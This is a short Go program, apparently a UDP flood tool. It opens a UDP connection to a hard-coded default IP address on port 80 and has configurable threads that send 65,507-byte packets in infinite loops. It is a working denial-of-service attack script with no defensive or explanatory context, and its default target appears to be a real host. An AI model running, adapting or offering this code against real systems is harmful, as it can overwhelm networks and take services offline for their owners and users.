package main

import (
	"flag"
	"fmt"
	"net"
)

var (
	_host    = flag.String("h", "213.230.108.254", "Specify Host")
	_port    = flag.Int("p", 80, "Specify Port")
	_threads = flag.Int("t", 1, "Specify threads")
	_size    = flag.Int("s", 65507, "Packet Size")
)

func main() {
	flag.Parse()

	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
	//Create send buffer
	buf := make([]byte, *_size)

	//Establish udp
	conn, err := net.Dial("udp", fullAddr)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("%s\n", fullAddr)
		for i := 0; i < *_threads; i++ {
			go func() {
				for {
					conn.Write(buf)
				}
			}()
		}
	}

	//Sleep forever
	<-make(chan bool, 1)
}
